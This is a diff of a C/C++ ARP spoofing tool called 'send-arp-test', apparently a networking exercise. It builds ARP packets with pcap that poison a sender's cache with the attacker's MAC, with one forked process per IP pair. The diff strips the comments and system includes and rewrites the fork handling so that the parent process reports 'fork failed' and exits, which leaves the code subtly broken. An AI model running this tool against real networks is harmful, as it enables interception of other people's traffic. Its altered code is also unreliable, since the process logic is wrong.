@@ -1,9 +1,4 @@
 #include "lihd.h"
-#include <sys/wait.h>
-#include <netinet/in.h>
-#include <net/if.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
 #include "pch.h"
 
 struct EthArpPacket final
@@ -17,7 +12,7 @@ struct net_info {
    uint8_t mac[6];
 };
 
-void usage()
+void nomal_out()
 {
 	printf("syntax: send-arp-test <interface> [<sender IP> <target IP> <sender IP> <target IP> ...]\n");
 	printf("sample: send-arp-test wlan0 192.168.1.1 192.168.1.3 192.168.1.2 192.168.1.3\n");
@@ -47,8 +42,8 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 	struct net_info target;
 	sender.ipv4 = Ip(sender_ip);
 	target.ipv4 = Ip(target_ip);
-	get_net_info(inface, attacker.mac, &attacker.ipv4); // mac, ip 받아오기
-	// sender에게 arp 요청 보내서 mac 받기 위한 arp 패킷 정의
+	get_net_info(inface, attacker.mac, &attacker.ipv4);
+
 	EthArpPacket arp_packet_to_sender;
 	arp_packet_to_sender.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
 	arp_packet_to_sender.eth_.smac_ = attacker.mac;
@@ -87,6 +82,7 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 	}
 
 	int res = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet_to_sender), sizeof(EthArpPacket));
+	
 	if (res != 0)
 	{
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
@@ -138,12 +134,9 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 	arp_packet.arp_.smac_ = attacker.mac;
 	arp_packet.arp_.tmac_ = sender.mac;
 	arp_packet.arp_.tip_ = htonl(sender.ipv4);
-	// 공격 패킷 전송
+	
 	int atk = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
-	if (atk != 0)
-	{
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
-	}
+	if (atk != 0){ fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet)); } 
 
 	while (true)
 	{
@@ -190,23 +183,26 @@ int main(int argc, char *argv[])
 {
 	if (argc < 3 || argc % 2 == 1)
 	{
-		usage();
-		return -1;
+		nomal_out();
+		exit(1);
+	}
+	else{
+	
 	}
 
 	char *iface = argv[1];
 	for (int i = 2; i < argc; i += 2)
 	{
-		pid_t pid = fork(); // 자식 프로세스 생성
-		if (pid == 0)
-		{ // 자식 프로세스 내부
+		pid_t pid; 
+		if ((pid = fork()) == 0)
+		{ 
 			process_ip_pair(iface, argv[i], argv[i + 1]);
-			exit(0); // 자식 프로세스 종료
+			exit(2); 
 		}
-		else if (pid < 0)
-		{
-			perror("fork failed");
-			return -1;
+		// fix check code
+		else {
+			fprintf(stderr,"fork failed");
+			exit(3);
 		}
 	}
 
